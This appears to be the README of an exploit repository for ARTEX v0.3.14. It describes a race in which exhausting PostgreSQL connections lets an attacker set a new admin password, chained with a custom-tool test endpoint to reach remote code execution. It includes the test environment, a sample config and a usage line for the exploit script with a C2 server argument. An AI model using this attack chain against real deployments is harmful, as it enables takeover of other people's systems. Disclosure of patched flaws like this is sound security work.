# ARTXploit
ARTEX v0.3.14 Remote Code Execution via TOCTOU Race Condition

## Executive Summary
By continuously sending requests to `/api/auth/status` until all PostgreSQL `max_connections` slots (100 sessions by default) are exhausted, `auth.go` in ARTEX v0.3.14 fails to establish a connection to the database. However, instead of treating the database connection failure as an error, the application incorrectly assumes that no password has been configured. It then accepts a new password and attempts to store it in the database, resulting in a TOCTOU (Time-of-Check to Time-of-Use) vulnerability.

The exploit chains this vulnerability with `/api/tools/custom/test`, ultimately achieving successful RCE (Remote Code Execution).

This vulnerability was explicitly fixed in a subsequent commit. When ARTEX is built using the updated code, the exploit no longer works.

## Exploit Reproduction Environment
| Field             | Value                                                     |
|:------------------|:----------------------------------------------------------|
| Hypervisor        | KVM QEMU emulator version 10.2.2 (qemu-10.2.2-1.fc44)     |
| Guest VM          | Ubuntu 26.04.1 Live Server AMD64                          |
|                   |                                                           |
| Product           | ARTEX AI                                                  |
| Version           | `v0.3.14`                                                 |
| Commit            | `b55ceb1fdd84a813d77de09a06af83d323a81f85`                |
|                   |                                                           |
| Go                | go version go1.26.3 linux/amd64                           |
| PostgreSQL        | psql (PostgreSQL) 18.6                                    |
| npm               | 9.2.0                                                     |

### Configuration
```json
{
    "database": {
        "host": "127.0.0.1",
        "port": 5432,
        "user": "artex",
        "password": "artxploit",
        "dbname": "artex",
        "sslmode": "disable"
    }
}
```


### Post Installation

| Setup Page | Dashboard |
|-|-|
| ![Setup](./rsrc/screenshots/Screenshot%20From%202026-10-07%2018-07-27.png) | ![Dashboard](./rsrc/screenshots/Screenshot%20From%202026-10-07%2018-10-28.png) |

![Console](./rsrc/screenshots/Screenshot%20From%202026-10-07%2018-11-18.png)

* Commit: [b55ceb1fdd84a813d77de09a06af83d323a81f85](https://github.com/Autumn-27/ARTEX/tree/b55ceb1fdd84a813d77de09a06af83d323a81f85)
* Release: [v0.3.14](https://github.com/Autumn-27/ARTEX/releases/tag/v0.3.14)

## Exploit Usage
```bash
python3 artxploit.py -t [TARGET] -p [NEW_PASSWORD] -c [C2_SERVER]
```

## References
* [https://artex-demo.vercel.app/](https://artex-demo.vercel.app/)
* [https://github.com/Autumn-27/ARTEX](https://github.com/Autumn-27/ARTEX)
* [https://github.com/Autumn-27/Norma](https://github.com/Autumn-27/Norma)
* [https://github.com/Autumn-27/ARTEX/releases/tag/v0.3.14](https://github.com/Autumn-27/ARTEX/releases/tag/v0.3.14)